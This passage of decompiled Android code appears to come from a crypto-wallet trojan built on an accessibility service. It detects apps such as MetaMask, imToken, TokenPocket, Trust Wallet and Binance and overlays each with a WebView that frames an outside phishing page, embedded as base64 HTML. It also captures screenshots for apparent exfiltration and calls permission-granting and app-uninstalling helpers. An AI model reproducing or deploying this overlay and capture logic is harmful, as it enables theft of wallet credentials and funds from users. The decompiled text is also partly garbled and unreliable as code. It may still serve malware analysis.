        v5.setStrokeWidth(-256);
        v8 = 1107296256; // 0x42000000
        v5.setTextSize(-256);
        "1080".drawRect(v6, v5);
        v6.exactCenterX();
        v12 = v6.exactCenterY();
        "1080".drawText("", -256, v6, v5);
        v11.drawViewHierarchy("1080", v12, v5);
        v12 = new SimpleDateFormat();
        // new SimpleDateFormat("yyyyMMdd_HHmmss")
        // new Date()
        v12.format("yyyyMMdd_HHmmss");
        v12 = new ByteArrayOutputStream();
        // new ByteArrayOutputStream()
        v5 = 100;
        "SCW".compress("yyyyMMdd_HHmmss", 100, v12);
        v12.toByteArray();
        // new StringBuilder()
        "SCW".append("yyyyMMdd_HHmmss");
        "SCW".append(":");
        "SCW".append("SCH");
        "SCW".append(":");
        "SCW".append(v1);
        "SCW".append(":skilton");
        "SCW".toString();
        DataEncryptionEngine.agreeltimelybfacilitatez38(":skilton", v12);
        return;
    }

     String getEventText(AccessibilityEvent param0) {
        v1.getText();
        v1.toString();
        return v1;
    }

     void lambda$continueb$2$com-tencent-tunesxconcerningn1012() {
        v0 = 5000;
        Thread.sleep(5000, v1);
        // goto (branch)
        5000.printStackTrace();
        // new Message()
        v1 = 2;
        5000.arg1 = 2;
        v1 = 5;
        5000.what = 5;
        5.sendMessage(5000);
        return;
    }

     void lambda$continuec$3$com-tencent-tunesxconcerningn1012() {
        v0 = 5000;
        Thread.sleep(5000, v1);
        // new Message()
        v1 = 3;
        5000.arg1 = 3;
        v1 = 5;
        5000.what = 5;
        5.sendMessage(5000);
        return;
        // new RuntimeException(5000)
        throw 5;
    }

     void lambda$continueclickBtn$1$com-tencent-tunesxconcerningn1012(int param0) {
        v0 = 5000;
        Thread.sleep(5000, v1);
        5000.sendEmptyMessage(v3);
        return;
        // new RuntimeException(v3)
        throw 5000;
    }

     void lambda$continued$4$com-tencent-tunesxconcerningn1012() {
        v0 = 5000;
        Thread.sleep(5000, v1);
        v1 = 4;
        5000.sendEmptyMessage(4);
        return;
        // new RuntimeException(5000)
        throw 4;
    }

     void lambda$onAccessibilityEvent$0$com-tencent-tunesxconcerningn1012(AccessibilityNodeInfo param0) {
        v0.createskilton(v1);
        return;
    }

    public String localeTextAccessibility() {
        v0 = new JSONObject();
        v1 = v2.localeForAccessibility;
        // new JSONObject(v1)
        Locale.getDefault();
        v1.getLanguage();
        v0 = v0.getString(v1);
        return v0;
        v0 = "Enable";
        return "Enable";
    }

    public void mouseDraw(Point[] param0, int param1) {
        v0 = Build$VERSION.SDK_INT;
        v1 = 24;
        if (v0 < 24) { // goto +125
        v0 = new Path();
        // new Path()
        v1 = 0;
        v2 = v7[0];
        v2 = v2.x;
        v2 = (float) v2;
        v3 = v7[0];
        v3 = v3.y;
        v3 = (float) v3;
        v0.moveTo(v2, v3);
        v2 = -69584122;
        v3 = 1;
        if (v8 != -69584122) { // goto +50
        Boolean.valueOf(1);
        -69584122.booleanValue();
        if (v4 == null || v4 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        -69584122.booleanValue();
        if (v4 == null || v4 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        -69584122.booleanValue();
        if (v4 == null || v4 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        -69584122.booleanValue();
        if (-69584122 == null || -69584122 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        if (1 >= 0) { // goto +49
        -69584122 = v7[1];
        -69584122 = -69584122.y;
        -69584122 = (float) -69584122;
        v0.lineTo(0, -69584122);
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        v1 = 0;
        v4 = (long) v8;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0, 0, -69584122, v4, v5);
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(-69584122, 0);
        v4 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(0);
        -69584122 = new AccessibilityServiceCore$2();
        // new AccessibilityServiceCore$2(v6)
        v4 = 0;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v6, 0, -69584122, 0);
        v3 = 1 + 1;
        // goto (branch)
        return;
    }

    public void onAccessibilityEvent(AccessibilityEvent param0) {
        v0 = v16;
        v1 = v17;
        v2 = "YES";
        v3 = "";
        AutoPermissionGranter.check(v1, v0);
        AppUninstallerEngine.check(...);
        ScreenLockMonitor.checkEvent(...);
        v4 = v0.showtrust;
        v5 = 8;
        if (v4 == null || v4 == 0) { // goto +42
        if (v4 != null && v4 != 0) { // goto +40
        AccessibilityEvent.getEventType(...);
        if (v4 != 8) { // goto +34
        AccessibilityServiceCore.checkIfClickPermission(...);
        if (v4 == null || v4 == 0) { // goto +3
        return;
        AccessibilityEvent.getSource(...);
        if (v4 == null || v4 == 0) { // goto +21
        v7 = v4.getViewIdResourceName();
        if (v6 == null || v6 == 0) { // goto +12
        v7 = "com.wallet.crypto.trustapp:id/input_general_amount";
        v6 = v6.equals("com.wallet.crypto.trustapp:id/input_general_amount");
        if (v6 == null || v6 == 0) { // goto +4
        v6 = BiometricTypeHelper.USDT;
        v4.recycle();
        v4 = v0.showbinance;
        if (v4 == null || v4 == 0) { // goto +38
        AccessibilityEvent.getEventType(...);
        if (v4 != 8) { // goto +32
        AccessibilityServiceCore.checkIfClickPermission(...);
        if (v4 == null || v4 == 0) { // goto +3
        return;
        AccessibilityEvent.getSource(...);
        if (v4 == null || v4 == 0) { // goto +19
        v4.getViewIdResourceName();
        if (v6 == null || v6 == 0) { // goto +10
        v6.equals("com.binance.dev:id/2131364953");
        if (v6 == null || v6 == 0) { // goto +2
        v4.recycle();
        v1 = AccessibilityEvent.getEventType(...);
        AccessibilityServiceCore.tunesxconcerningn1012GlobalEvent = v1;
        // goto (branch)
        v6 = 0;
        v8 = 16;
        v10 = 2;
        if (0 == 2) { // goto +24
        if (0 == 8) { // goto +20
        if (0 == 16) { // goto +16
        v12 = 32;
        if (0 == 32) { // goto +10
        v12 = 64;
        if (0 == 64) { // goto +4
        v12 = 0;
        // goto (branch)
        v12 = 4;
        // goto (branch)
        v12 = 5;
        // goto (branch)
        v12 = 3;
        // goto (branch)
        v12 = 1;
        // goto (branch)
        v0.tunesxconcerningn1012sendlog(v1, 1);
        AccessibilityEvent.getPackageName(...);
        v13.toString();
        v15 = v13.toLowerCase();
        v15 = AccessibilityServiceCore.getApplicationContext(...);
        v15 = "SME";
        v9 = My_tunesxconcerningn10_Settings.read(v14, "SME", "");
        v9 = v14.equals("YES");
        v9 = "ko";
        v4 = 2048;
        if (v14 == null || v14 == 0) { // goto +177
        v14 = "io.metamask";
        v13.equals("io.metamask");
        if ("io.metamask" == null || "io.metamask" == 0) { // goto +169
        AccessibilityEvent.getEventType(...);
        if ("io.metamask" != 2048) { // goto +163
        v11 = AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write("io.metamask", "SME", "NO");
        // new AccessibilityServiceCore$MyWebView(v0, v0)
        v11 = -1;
        // new ViewGroup$LayoutParams(-1, -1)
        "SME".setLayoutParams("io.metamask");
        "SME".requestFocus();
        v11 = 1;
        "SME".setFocusable(1);
        "SME".setFocusableInTouchMode(1);
        "SME".getSettings();
        "io.metamask".setJavaScriptEnabled(1);
        "io.metamask".setJavaScriptCanOpenWindowsAutomatically(1);
        "io.metamask".setDomStorageEnabled(1);
        "io.metamask".setCacheMode(1);
        v11 = 0;
        "SME".setScrollBarStyle(0);
        v11 = 0;
        v14 = 2;
        "SME".setLayerType(2, 0);
        // new AccessibilityServiceCore$MyWebViewClient(v0, 0)
        "SME".setWebViewClient(2);
        // new AccessibilityServiceCore$MyWebChromeClient(v0, 0)
        "SME".setWebChromeClient(2);
        v11 = 130;
        "SME".requestFocus(130);
        "SME".requestFocusFromTouch();
        v11 = 1;
        "SME".setEnabled(1);
        Locale.getDefault();
        v1 = 1.getLanguage();
        v1 = 1.hashCode();
        v1 = 3241;
        if (2 == 3241) { // goto +27
        v1 = 3383;
        if (2 == 3383) { // goto +15
        v1 = 3428;
        if (2 == 3428) { // goto +3
        // goto (branch)
        v1 = 1.equals("ko");
        if (3428 == null || 3428 == 0) { // goto +20
        v1 = 2;
        // goto (branch)
        v1 = 1.equals("ja");
        if (2 == null || 2 == 0) { // goto +12
        v1 = 1;
        // goto (branch)
        v1 = 1.equals("en");
        if (1 == null || 1 == 0) { // goto +4
        v1 = 0;
        // goto (branch)
        v1 = -1;
        if (-1 == null || -1 == 0) { // goto +17
        v11 = 1;
        if (-1 == 1) { // goto +11
        v11 = 2;
        if (-1 == 2) { // goto +5
        -1 = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==";
        // goto (branch)
        // goto (branch)
        // goto (branch)
        "SME".loadData("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==", "text/html", "base64");
        v0.loadMyPage("SME");
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.read("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==", "SIM", "");
        "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==".equals("YES");
        if ("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==" == null || "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9tZXRhbWFzayIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==" == 0) { // goto +179
        v13.equals("im.token.app");
        if ("im.token.app" == null || "im.token.app" == 0) { // goto +171
        v4 = AccessibilityEvent.getEventType(...);
        v4 = 2048;
        if ("im.token.app" != 2048) { // goto +163
        v11 = AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write("im.token.app", "SIM", "NO");
        // new AccessibilityServiceCore$MyWebView(v0, v0)
        v11 = -1;
        // new ViewGroup$LayoutParams(-1, -1)
        "im.token.app".setLayoutParams("SIM");
        "im.token.app".requestFocus();
        v4 = 1;
        "im.token.app".setFocusable(1);
        "im.token.app".setFocusableInTouchMode(1);
        "im.token.app".getSettings();
        -1.setJavaScriptEnabled(1);
        -1.setJavaScriptCanOpenWindowsAutomatically(1);
        -1.setDomStorageEnabled(1);
        -1.setCacheMode(1);
        v4 = 0;
        "im.token.app".setScrollBarStyle(0);
        v4 = 0;
        v11 = 2;
        "im.token.app".setLayerType(2, 0);
        // new AccessibilityServiceCore$MyWebViewClient(v0, 0)
        "im.token.app".setWebViewClient(2);
        // new AccessibilityServiceCore$MyWebChromeClient(v0, 0)
        "im.token.app".setWebChromeClient(2);
        v4 = 130;
        "im.token.app".requestFocus(130);
        "im.token.app".requestFocusFromTouch();
        v4 = 1;
        "im.token.app".setEnabled(1);
        Locale.getDefault();
        v14 = 1.getLanguage();
        v14 = 1.hashCode();
        v14 = 3241;
        if (2 == 3241) { // goto +27
        v14 = 3383;
        if (2 == 3383) { // goto +15
        v14 = 3428;
        if (2 == 3428) { // goto +3
        // goto (branch)
        v4 = 1.equals("ko");
        if (1 == null || 1 == 0) { // goto +20
        v4 = 2;
        // goto (branch)
        v4 = 2.equals("ja");
        if (2 == null || 2 == 0) { // goto +12
        v4 = 1;
        // goto (branch)
        v4 = 1.equals("en");
        if (1 == null || 1 == 0) { // goto +4
        v4 = 0;
        // goto (branch)
        v4 = -1;
        if (-1 == null || -1 == 0) { // goto +17
        v11 = 1;
        if (-1 == 1) { // goto +11
        v11 = 2;
        if (-1 == 2) { // goto +5
        -1 = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+";
        // goto (branch)
        // goto (branch)
        // goto (branch)
        "im.token.app".loadData("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby9pbXRva2VuIi8+DQo8L2ZyYW1lc2V0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+", "text/html", "base64");
        v0.loadMyPage("im.token.app");
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.read("im.token.app", "STO", "");
        "im.token.app".equals("YES");
        if ("im.token.app" == null || "im.token.app" == 0) { // goto +179
        v13.equals("vip.mytokenpocket");
        if ("vip.mytokenpocket" == null || "vip.mytokenpocket" == 0) { // goto +171
        v4 = AccessibilityEvent.getEventType(...);
        v4 = 2048;
        if ("vip.mytokenpocket" != 2048) { // goto +163
        v11 = AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write("vip.mytokenpocket", "STO", "NO");
        // new AccessibilityServiceCore$MyWebView(v0, v0)
        v11 = -1;
        // new ViewGroup$LayoutParams(-1, -1)
        "vip.mytokenpocket".setLayoutParams("STO");
        "vip.mytokenpocket".requestFocus();
        v4 = 1;
        "vip.mytokenpocket".setFocusable(1);
        "vip.mytokenpocket".setFocusableInTouchMode(1);
        "vip.mytokenpocket".getSettings();
        -1.setJavaScriptEnabled(1);
        -1.setJavaScriptCanOpenWindowsAutomatically(1);
        -1.setDomStorageEnabled(1);
        -1.setCacheMode(1);
        v4 = 0;
        "vip.mytokenpocket".setScrollBarStyle(0);
        v4 = 0;
        v11 = 2;
        "vip.mytokenpocket".setLayerType(2, 0);
        // new AccessibilityServiceCore$MyWebViewClient(v0, 0)
        "vip.mytokenpocket".setWebViewClient(2);
        // new AccessibilityServiceCore$MyWebChromeClient(v0, 0)
        "vip.mytokenpocket".setWebChromeClient(2);
        v4 = 130;
        "vip.mytokenpocket".requestFocus(130);
        "vip.mytokenpocket".requestFocusFromTouch();
        v4 = 1;
        "vip.mytokenpocket".setEnabled(1);
        Locale.getDefault();
        v14 = 1.getLanguage();
        v14 = 1.hashCode();
        v14 = 3241;
        if (2 == 3241) { // goto +27
        v14 = 3383;
        if (2 == 3383) { // goto +15
        v14 = 3428;
        if (2 == 3428) { // goto +3
        // goto (branch)
        v4 = 1.equals("ko");
        if (1 == null || 1 == 0) { // goto +20
        v4 = 2;
        // goto (branch)
        v4 = 2.equals("ja");
        if (2 == null || 2 == 0) { // goto +12
        v4 = 1;
        // goto (branch)
        v4 = 1.equals("en");
        if (1 == null || 1 == 0) { // goto +4
        v4 = 0;
        // goto (branch)
        v4 = -1;
        if (-1 == null || -1 == 0) { // goto +17
        v11 = 1;
        if (-1 == 1) { // goto +11
        v11 = 2;
        if (-1 == 2) { // goto +5
        -1 = "hPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==";
        // goto (branch)
        // goto (branch)
        // goto (branch)
        "vip.mytokenpocket".loadData("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90b2tlbnBvY2tldCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==", "text/html", "base64");
        v0.loadMyPage("vip.mytokenpocket");
        AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.read("vip.mytokenpocket", "STR", "");
        "vip.mytokenpocket".equals("YES");
        if ("vip.mytokenpocket" == null || "vip.mytokenpocket" == 0) { // goto +180
        v13.equals("com.wallet.crypto.trustapp");
        if ("com.wallet.crypto.trustapp" == null || "com.wallet.crypto.trustapp" == 0) { // goto +172
        v2 = AccessibilityEvent.getEventType(...);
        v2 = 2048;
        if ("com.wallet.crypto.trustapp" != 2048) { // goto +164
        v3 = AccessibilityServiceCore.getApplicationContext(...);
        My_tunesxconcerningn10_Settings.Write("com.wallet.crypto.trustapp", "STR", "NO");
        // new AccessibilityServiceCore$MyWebView(v0, v0)
        v3 = -1;
        // new ViewGroup$LayoutParams(-1, -1)
        "com.wallet.crypto.trustapp".setLayoutParams("STR");
        "com.wallet.crypto.trustapp".requestFocus();
        v2 = 1;
        "com.wallet.crypto.trustapp".setFocusable(1);
        "com.wallet.crypto.trustapp".setFocusableInTouchMode(1);
        "com.wallet.crypto.trustapp".getSettings();
        "STR".setJavaScriptEnabled(1);
        "STR".setJavaScriptCanOpenWindowsAutomatically(1);
        "STR".setDomStorageEnabled(1);
        "STR".setCacheMode(1);
        v2 = 0;
        "com.wallet.crypto.trustapp".setScrollBarStyle(0);
        v2 = 2;
        v11 = 0;
        "com.wallet.crypto.trustapp".setLayerType(2, 0);
        // new AccessibilityServiceCore$MyWebViewClient(v0, 0)
        "com.wallet.crypto.trustapp".setWebViewClient(2);
        // new AccessibilityServiceCore$MyWebChromeClient(v0, 0)
        "com.wallet.crypto.trustapp".setWebChromeClient(2);
        v2 = 130;
        "com.wallet.crypto.trustapp".requestFocus(130);
        "com.wallet.crypto.trustapp".requestFocusFromTouch();
        v2 = 1;
        "com.wallet.crypto.trustapp".setEnabled(1);
        Locale.getDefault();
        v10 = 1.getLanguage();
        v10 = 1.hashCode();
        v10 = 3241;
        if ("STR" == 3241) { // goto +27
        v10 = 3383;
        if ("STR" == 3383) { // goto +15
        v7 = 3428;
        if ("STR" == 3428) { // goto +3
        // goto (branch)
        v2 = 1.equals("ko");
        if (1 == null || 1 == 0) { // goto +20
        v2 = 2;
        // goto (branch)
        v2 = 2.equals("ja");
        if (2 == null || 2 == 0) { // goto +12
        v2 = 1;
        // goto (branch)
        v2 = 1.equals(3428);
        if (1 == null || 1 == 0) { // goto +4
        v2 = 0;
        // goto (branch)
        if (0 == null || 0 == 0) { // goto +17
        v4 = 1;
        if (0 == 1) { // goto +11
        v4 = 2;
        if (0 == 2) { // goto +5
        // goto (branch)
        // goto (branch)
        // goto (branch)
        "com.wallet.crypto.trustapp".loadData("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPjwvdGl0bGU+DQo8c3R5bGU+DQoqIHsNCiAgICBtYXJnaW46IDA7DQogICAgcGFkZGluZzogMDsNCn0NCg0KaHRtbCxib2R5ew0KIGhlaWdodDoxMDAlOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZnJhbWVzZXQ+DQo8aWZyYW1lICBmcmFtZWJvcmRlcj0ibm8iIGJvcmRlcj0iMCIgIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIG5hbWU9ImZyYW1lIiBzcmM9Imh0dHBzOi8vdXNkdC50aWFueGlhbjYuaW5mby90cnVzdCIvPg0KPC9mcmFtZXNldD4NCg0KPC9ib2R5Pg0KPC9odG1sPg==", "text/html", "base64");
        v0.loadMyPage("com.wallet.crypto.trustapp");
        // goto (branch)
        v3 = -1;
        v11 = 0;
        v1 = 5;
        if (1 != 5) { // goto +117
        AccessibilityEvent.getPackageName(...);
        5.equals("com.transsion.XOSLauncher.upgrade");
        if (5 != null && 5 != 0) { // goto +98
        AccessibilityEvent.getPackageName(...);
        5.equals("com.google.android.apps.nexuslauncher");
        if (5 != null && 5 != 0) { // goto +86
        AccessibilityEvent.getPackageName(...);
        5.equals("com.android.launcher3");
        if (5 != null && 5 != 0) { // goto +74
        AccessibilityEvent.getPackageName(...);
        5.equals("com.android.launcher2");
        if (5 != null && 5 != 0) { // goto +62
        AccessibilityEvent.getPackageName(...);
        5.equals("com.android.launcher");
        if (5 != null && 5 != 0) { // goto +50
        AccessibilityEvent.getPackageName(...);
        5.equals("com.bbk.launcher2");
        if (5 != null && 5 != 0) { // goto +38
        AccessibilityEvent.getPackageName(...);
        5.equals("com.bbk.launcher");
        if (5 != null && 5 != 0) { // goto +26
        AccessibilityEvent.getPackageName(...);
        5.equals("com.huawei.android.launcher");
        if (5 != null && 5 != 0) { // goto +14
        AccessibilityEvent.getPackageName(...);
        v2 = 5.equals("com.miui.home");
        if (5 == null || 5 == 0) { // goto +9
        v2 = 8;
        5.setVisibility(8);
        v2 = AccessibilityEvent.getEventType(...);
        v2 = 1;
        if (5 != 1) { // goto +114
        if (5 == null || 5 == 0) { // goto +43
        if (5 == null || 5 == 0) { // goto +41
        v2 = 2;
        if (5 != 2) { // goto +38
        AccessibilityEvent.getPackageName(...);
        "com.wallet.crypto.trustapp".equals(2);
